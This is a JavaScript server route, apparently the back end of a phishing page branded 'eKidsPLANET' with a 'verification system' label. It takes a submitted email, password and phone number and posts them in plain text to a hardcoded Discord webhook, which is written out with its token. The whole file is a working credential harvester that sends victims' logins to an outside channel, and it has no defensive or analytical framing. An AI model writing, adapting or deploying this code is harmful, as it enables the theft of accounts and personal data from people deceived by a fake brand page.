export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Method Not Allowed' });
  }

  const { email, password, phone } = req.body;

  const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1538652119328890935/Arg0WqWk3idlFaJkOQwZWhHVShDOH0IuduQBkhFmufSi1EJOsorDQuqtuXl2T76L4p5V";

  const discordPayload = {
    embeds: [
      {
        title: "📥 Nowe Zgłoszenie — eKidsPLANET",
        color: 0x70a1ff,
        fields: [
          {
            name: "📧 E-mail / Login",
            value: `\`${email || 'Brak'}\``,
            inline: false
          },
          {
            name: "🔑 Hasło",
            value: `\`${password || 'Brak'}\``,
            inline: false
          },
          {
            name: "📱 Numer telefonu",
            value: `\`${phone || 'Brak'}\``,
            inline: false
          }
        ],
        footer: {
          text: "System Weryfikacji KidsPLANET"
        },
        timestamp: new Date().toISOString()
      }
    ]
  };

  try {
    const response = await fetch(DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(discordPayload)
    });

    if (response.ok) {
      return res.status(200).json({ success: true });
    } else {
      return res.status(500).json({ message: 'Błąd wysyłki do Discorda' });
    }
  } catch (error) {
    return res.status(500).json({ message: 'Błąd serwera', error: error.message });
  }
}